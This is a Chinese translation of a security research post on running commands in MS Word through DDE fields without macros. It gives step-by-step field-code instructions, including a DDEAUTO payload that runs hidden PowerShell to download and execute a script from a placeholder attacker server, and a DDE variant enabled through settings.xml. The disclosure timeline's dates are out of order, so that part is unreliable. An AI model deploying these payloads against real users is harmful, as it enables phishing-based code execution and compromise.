# 【技术分享】微软 Office Word 无宏命令执行漏洞

## 译文声明
本文是翻译文章，原文来源：[sensepost.com](http://sensepost.com)。译文仅供参考，具体内容表达及含义以原文为准。

**译者：** [myles007](http://bobao.360.cn/member/contribute?uid=749283137)  
**预估稿费：** 120RMB  
**投稿方式：** 发送邮件至 [linwei#360.cn](mailto:linwei@360.cn)，或登录[网页版](http://bobao.360.cn/contribute/index) 在线投稿

## 前言
如果你被告知在 MS-Word 中存在一种无需宏或内存溢出即可执行命令的漏洞，你会怎么想？

Windows 提供了多种应用程序间的数据传输方法，其中之一就是动态数据交换协议（DDE）。DDE 是一套消息和参考指南，用于在共享数据的应用程序之间发送消息，并使用共享内存在这些应用程序之间进行数据交换。应用程序可以使用 DDE 进行一次性数据传输和持续数据交换，在新数据可用时，应用程序会互相发送更新。

在接下来的内容中，我们将通过一个示例展示如何利用 DDE 协议执行命令。在之前的帖子中，我们讨论过如何在 MS-Excel 中使用 DDE 获取命令执行，并成功绕过了宏过滤邮件安全网关和企业 VBA 策略。虽然 DDE 不仅限于 Excel，也可以在 Word 中使用，但据我们所知，目前还没有人实际证明这一点。

## DDE 和 Office
艾蒂安和我正在研究一些有趣的 COM 对象，特别是与 MS-Office 相关的内容。我们发现，MS-Excel 和 MS-Word 都暴露了 COM 方法来进行 DDE 初始化和 DDE 执行。由于 MS-Excel 已经提供了命令执行的方法，我们决定进一步探索如何在 MS-Word 中使用 DDE 并实现命令执行。

经过不懈努力，我们终于弄清楚了如何在 MS-Word 中使用 DDE。以下是具体步骤：

1. **插入字段**：
   - 选择 `插入` -> `文档部件` -> `域`
   - 选择 `=(Formula)`，然后点击确认
   - 文档中将插入一个字段，并显示错误“!异常的公式结尾”。右键单击该字段，选择“切换字段代码”。

2. **替换字段代码**：
   - 字段代码将显示出来，将其替换为以下内容：
     ```plaintext
     {DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe"}
     ```
   - `DDEAUTO` 关键字通知 MS-Word 这是一个 DDE 字段，并会在文档打开时自动执行。第二部分代码分为两段，第一段是可执行文件的完整路径，第二段是传递给可执行程序的参数（例如执行 `calc.exe`）。

另一种方法是使用 `CTRL+F9` 直接创建一个空的字段标识符，然后直接插入上面的 DDE 测试代码。

3. **保存并测试**：
   - 将文档保存为普通的 Word 文档（`.docx`），并在任何机器上打开它。
   - 第一个警告弹窗是关于更新文档链接，并没有任何恶意内容。
   - 第二个提示要求用户是否需要执行指定的应用程序。到目前为止，我们可以认为这是一个安全告警，仅要求用户执行 `cmd.exe`。这里可以通过修改语法来隐藏它。

当受害者打开此文档时，会看到一个提示窗口。最令人惊讶的是，经过安全扫描后，我们发现没有任何有关宏或其他恶意内容的安全告警。

## 示例
为了演示这一概念验证（POC），我们制作了一个使用 Empire 攻击器的视频。我们在进行安全扫描验证后，给出了以下 Payload：
```plaintext
{DDEAUTO c:\Windows\System32\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evilserver.ninja/pp.ps1');powershell -e $e"}
```

## 其他方法
我们还可以使用 `DDE` 字段标识符实现相同效果：
```plaintext
{DDE "c:\windows\system32\cmd.exe" "/c notepad"}
```
为此，需要对 `.docx` 文件进行相应修改以启用自动链接更新。请在文档管理器中打开 `.docx` 文件，并在 `word/settings.xml` 中设置相应的 XML 标签。保存文档更新设置后，Word 会弹出自动更新链接的提示，与之前的提示稍有不同，但效果完全相同。

## 漏洞披露时间表
- 2017/08/23 – 向 Microsoft 报告该问题，询问他们是否有兴趣修复。
- 2017/08/23 – Microsoft 回应称已成功复现该问题，并请求更多细节。
- 2017/09/26 – Microsoft 回应称这是一项功能，不会采取进一步行动，但将在下一版本中考虑修复。
- 2017/09/10 – 发布公开博客文章

## 其他资源
- [原帖地址](http://sensepost.com)

希望这篇文章对你有所帮助！